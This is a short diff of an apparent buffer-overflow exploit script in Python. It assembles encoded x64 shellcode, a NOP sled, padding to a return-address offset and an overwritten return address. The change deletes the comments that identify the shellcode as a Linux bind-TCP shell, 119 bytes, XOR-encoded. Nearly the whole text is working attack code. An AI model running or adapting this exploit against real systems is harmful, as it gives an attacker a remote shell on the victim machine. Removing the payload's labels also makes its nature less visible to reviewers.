@@ -2,10 +2,6 @@
 import sys
 from struct import pack
 
-# payload: linux/x64/shell/bind_tcp
-# length: 119 bytes
-# encoder: x64/xor
-
 buf =  b""
 buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
 buf += b"\x05\xef\xff\xff\xff\x48\xbb\x8e\xa4\xfd\xd1\x6b"
@@ -22,6 +18,7 @@ distance_to_ra = 296
 nopsled = b"\x90" * 60
 padding_length = distance_to_ra - len(nopsled) - len(buf)
 padding = b"A" * padding_length
+
 address = pack("<Q", 0x7fffffffe87c)
 
 payload = b""
